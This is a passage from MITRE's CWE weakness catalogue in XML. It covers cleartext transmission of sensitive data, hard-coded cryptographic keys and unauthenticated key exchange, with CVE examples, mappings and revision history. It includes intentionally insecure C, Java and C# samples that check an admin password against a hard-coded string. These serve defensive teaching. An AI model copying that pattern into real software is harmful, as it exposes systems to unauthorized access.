               <Description>Programmable Logic Controller (PLC) sends password in plaintext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-31204</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1949</Reference>
               <Description>Passwords transmitted in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1949</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4122</Reference>
               <Description>Chain: Use of HTTPS cookie without "secure" flag causes it to be transmitted across unencrypted HTTP.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4122</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3289</Reference>
               <Description>Product sends password hash in cleartext in violation of intended policy.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3289</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4390</Reference>
               <Description>Remote management feature sends sensitive information including passwords in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4390</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5626</Reference>
               <Description>Backup routine sends password in cleartext in email.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5626</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1852</Reference>
               <Description>Product transmits Blowfish encryption key in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1852</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0374</Reference>
               <Description>Printer sends configuration information, including administrative password, in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0374</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4961</Reference>
               <Description>Chain: cleartext transmission of the MD5 hash of password enables attacks against a server that is susceptible to replay (CWE-294).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4961</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4786</Reference>
               <Description>Product sends passwords in cleartext to a log server.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4786</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3140</Reference>
               <Description>Product sends file with cleartext passwords in e-mail message intended for diagnostic purposes.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3140</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Plaintext Transmission of Sensitive Information</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC06-J</Entry_ID>
               <Entry_Name>Do not rely on the default automatic signature verification provided by URLClassLoader and java.util.jar</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER02-J</Entry_ID>
               <Entry_Name>Sign then seal sensitive objects before sending them outside a trust boundary</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 3-3</Entry_ID>
              <Entry_Name>Req SR 4.1</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-2</Entry_ID>
              <Entry_Name>Req CR 4.1B</Entry_Name>
			</Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="102"/>
            <Related_Attack_Pattern CAPEC_ID="117"/>
            <Related_Attack_Pattern CAPEC_ID="383"/>
            <Related_Attack_Pattern CAPEC_ID="477"/>
            <Related_Attack_Pattern CAPEC_ID="65"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-271"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 9, &#34;Protecting Secret Data&#34; Page 299"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 22: Failing to Protect Network Traffic.&#34; Page 337"/>
            <Reference External_Reference_ID="REF-172"/>
            <Reference External_Reference_ID="REF-1283"/>
            <Reference External_Reference_ID="REF-1307" Section="Sections 3.1 and 3.10"/>
            <Reference External_Reference_ID="REF-1309"/>
         </References>
         <Notes>
	       <Note Type="Maintenance">The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the "Mapping CWE to 62443" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-01-23</Modification_Date>
               <Modification_Comment>updated Abstraction </Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships, Type</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Maintenance_Notes, Modes_of_Introduction, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>Accellera IP Security Assurance (IPSA) Working Group</Contribution_Name>
	       <Contribution_Organization>Accellera Systems Initiative</Contribution_Organization>
               <Contribution_Date>2023-01-24</Contribution_Date>
               <Contribution_Comment>Submitted original contents of CWE-1324 and reviewed its integration into this entry.</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2009-01-12">Plaintext Transmission of Sensitive Information</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="321" Name="Use of Hard-coded Cryptographic Key" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The use of a hard-coded cryptographic key significantly increases the possibility that encrypted data may be recovered.</Description>
         <Related_Weaknesses>
             <Related_Weakness Nature="ChildOf" CWE_ID="798" View_ID="1000" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="798" View_ID="1305" Ordinal="Primary"/>
			 <Related_Weakness Nature="ChildOf" CWE_ID="798" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
	    <Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>If hard-coded cryptographic keys are used, it is almost certain that malicious users will gain access through the account in question.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Prevention schemes mirror that of hard-coded password storage.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-92">
               <Intro_Text>The following code examples attempt to verify a password using a hard-coded cryptographic key.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int VerifyAdmin(char *password) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if (strcmp(password,"68af404b513073584c4b6f22b6c63e6b")) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:br/>printf("Incorrect Password!\n");<xhtml:br/>return(0);</xhtml:div>
                           </xhtml:div>}<xhtml:br/>printf("Entering Diagnostic Mode...\n");<xhtml:br/>return(1);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public boolean VerifyAdmin(String password) {<xhtml:div style="margin-left:1em;">if (password.equals("68af404b513073584c4b6f22b6c63e6b")) {<xhtml:div style="margin-left:1em;">System.out.println("Entering Diagnostic Mode...");<xhtml:br/>return true;</xhtml:div>}<xhtml:br/>System.out.println("Incorrect Password!");<xhtml:br/>return false;</xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>int VerifyAdmin(String password) {<xhtml:div style="margin-left:1em;">if (password.Equals("68af404b513073584c4b6f22b6c63e6b")) {<xhtml:div style="margin-left:1em;">Console.WriteLine("Entering Diagnostic Mode...");<xhtml:br/>return(1);</xhtml:div>}<xhtml:br/>Console.WriteLine("Incorrect Password!");<xhtml:br/>return(0);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The cryptographic key is within a hard-coded string value that is compared to the password. It is likely that an attacker will be able to read the key and compromise the system.</Body_Text>
            </Demonstrative_Example>
         <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	         <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	         <Body_Text>Multiple vendors used hard-coded keys for critical functionality in their OT products.</Body_Text>
	    </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-29960</Reference>
               <Description>Engineering Workstation uses hard-coded cryptographic keys that could allow for unathorized filesystem access and privilege escalation</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29960</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30271</Reference>
               <Description>Remote Terminal Unit (RTU) uses a hard-coded SSH private key that is likely to be used by default.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30271</Link>
            </Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2020-10884</Reference>
	      <Description>WiFi router service has a hard-coded encryption key, allowing root access</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2020-10884</Link>
	    </Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2014-2198</Reference>
	      <Description>Communications / collaboration product has a hardcoded SSH private key, allowing access to root account</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2014-2198</Link>
	    </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Use of hard-coded cryptographic key</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Cryptographic Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A9</Entry_ID>
               <Entry_Name>Insecure Communications</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP33</Entry_ID>
               <Entry_Name>Hardcoded sensitive data</Entry_Name>
            </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 2-4</Entry_ID>
             <Entry_Name>Req SP.03.08</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 2-4</Entry_ID>
             <Entry_Name>Req SP.03.10</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 3-3</Entry_ID>
             <Entry_Name>Req SR 1.5</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 3-3</Entry_ID>
             <Entry_Name>Req SD-1</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 3-3</Entry_ID>
             <Entry_Name>Req SR 4.3</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
             <Entry_Name>Req SD-1</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-2</Entry_ID>
             <Entry_Name>Req SR 4.3</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-2</Entry_ID>
             <Entry_Name>Req CR 7.3</Entry_Name>
           </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-1283"/>
         </References>
         <Notes>
            <Note Type="Other">The main difference between the use of hard-coded passwords and the use of hard-coded cryptographic keys is the false sense of security that the former conveys. Many people believe that simply hashing a hard-coded password before storage will protect the information from malicious users. However, many hashes are reversible (or at least vulnerable to brute force attacks) -- and further, many authentication protocols simply request the hash itself, making it no better than a password.</Note>
	    <Note Type="Maintenance">The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the "Mapping CWE to 62443" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Maintenance_Notes, Taxonomy_Mappings</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-01-24</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="322" Name="Key Exchange without Entity Authentication" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product performs a key exchange with an actor without verifying the identity of that actor.</Description>
         <Extended_Description>Performing a key exchange will preserve the integrity of the information sent between two entities, but this will not guarantee that the entities are who they claim they are. This may enable an attacker to impersonate an actor by modifying traffic between the two entities.  Typically, this involves a victim client that contacts a malicious server that is impersonating a trusted server. If the client skips authentication or ignores an authentication failure, the malicious server may request authentication information from the user. The malicious server can then use this authentication information to log in to the trusted server using the victim's credentials, sniff traffic between the victim and trusted server, etc.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="306" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="923" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="295" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>No authentication takes place in this process, bypassing an assumed protection of encryption.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>The encrypted communication between a user and a trusted host may be subject to sniffing by any actor in the communication path.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that proper authentication is included in the system design.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Understand and properly implement all checks necessary to ensure the identity of entities involved in encrypted communications.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>Many systems have used Diffie-Hellman key exchange without authenticating the entities exchanging keys, allowing attackers to influence communications by redirecting or interfering with the communication path.  Many people using SSL/TLS skip the authentication (often unknowingly).</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Key exchange without entity authentication</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 23: Improper Use of PKI, Especially SSL.&#34; Page 347"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Untrustworthy Credentials&#34;, Page 37"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-10</Modification_Date>
               <Modification_Comment>clarified the description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
